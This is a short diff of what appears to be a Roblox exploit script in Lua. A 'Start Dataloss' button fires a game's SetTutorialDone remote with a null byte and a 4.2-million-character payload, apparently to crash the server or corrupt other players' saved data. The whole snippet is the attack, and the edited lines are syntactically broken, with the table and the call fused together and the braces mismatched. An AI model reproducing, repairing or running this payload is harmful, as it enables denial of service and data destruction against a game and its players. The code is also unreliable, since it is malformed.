@@ -19,10 +19,9 @@ local A = Y.Button({
     Text = "You have not selected any Dataloss Type",
     Callback = function()
         if Type == "Start Dataloss" then
-                    local args = {
-                        [1] = {
-                            ["1\0" .. game.ReplicatedStorage.Remote.SetTutorialDone:FireServer("\0" .. string.rep("B", 4200000))
-                        },
+                   local args = {
+                            [1] = "\0" .. string.rep("B", 4200000)game.ReplicatedStorage.Remote.SetTutorialDone:FireServer(unpack(args))
+                            },
                         [2] = "AFS_Is_Dogshit",
                         [3] = 3
                     }
